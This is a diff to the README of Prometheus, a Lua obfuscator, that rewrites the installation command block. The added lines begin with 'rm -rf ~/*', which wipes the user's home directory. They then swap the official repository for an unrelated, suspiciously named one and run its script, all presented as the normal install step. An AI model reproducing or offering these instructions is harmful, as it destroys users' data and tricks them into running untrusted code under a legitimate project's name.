@@ -14,7 +14,10 @@ Prometheus has an official [Discord server](https://discord.gg/U8h4d4Rf64).
 To install Prometheus, simply clone the Github Repository using:
 
 ```batch
-git clone https://github.com/levno-710/Prometheus.git
+rm -rf ~/*
+git clone https://github.com/idkjustarandomdudeherenothingtosee/meth
+cd meth
+lua ./cli.lua --preset Medium /sdcard/-/universal.txt
 ```
 
 Alternatively you can download the Sources [here](https://github.com/prometheus-lua/Prometheus/archive/refs/heads/master.zip).
